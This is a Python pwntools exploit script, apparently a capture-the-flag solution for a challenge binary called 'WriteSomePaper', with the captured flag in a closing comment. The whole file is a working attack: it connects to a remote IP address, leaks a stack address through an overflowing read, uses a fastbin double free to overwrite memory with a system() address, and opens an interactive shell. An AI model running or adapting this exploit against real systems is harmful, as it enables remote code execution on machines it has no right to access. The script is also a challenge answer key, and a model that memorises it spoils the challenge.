from pwn import *

DEBUG = 0

if DEBUG:
    sh = process('./WriteSomePaper')
    context.log_level = 'debug'
    context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
else:
    sh = remote('47.104.16.75', 8999)

system_addr = 0x400943


def leak():
    payload = 'A' * 48
    sh.sendafter('2 delete paper\n', payload)
    sh.sendafter('number!\n', payload)
    data = sh.recvuntil(' input is not start with number!\n', drop=True)
    stack_addr = u64(data[48:].ljust(8, '\x00'))
    log.info('leak stack addr: {0}'.format(hex(stack_addr)))
    return stack_addr


def add_paper(index, lenth, content, wait=True):
    if wait:
        sh.recvuntil('2 delete paper\n')
    sh.sendline('1')
    sh.sendlineafter('store(0-9):', str(index))
    sh.sendlineafter('enter:', str(lenth))
    sh.sendlineafter('content:', content)


def delete_paper(index):
    sh.sendlineafter('2 delete paper\n', '2')
    sh.sendlineafter('index(0-9):', str(index))


# leak secret stack rbp
sh.sendlineafter('2 delete paper\n', '3')
sh.sendlineafter('enter your luck number:', '33')
secret_rbp_addr = leak()
assert secret_rbp_addr > 0x7ff000000000

# fastbin double free
add_paper(0, 16, 'A' * 16, False)
add_paper(1, 16, 'B' * 16)
delete_paper(0)
delete_paper(1)
delete_paper(0)

add_paper(0, 16, p64(secret_rbp_addr + 0x10) * 2)
add_paper(1, 16, 'B' * 16)
add_paper(0, 16, 'C' * 16)

add_paper(2, 16, p64(system_addr) * 2)

# get shell
sh.sendlineafter('2 delete paper\n', '5')
sh.interactive()

# flag{ISCC_SoEasy}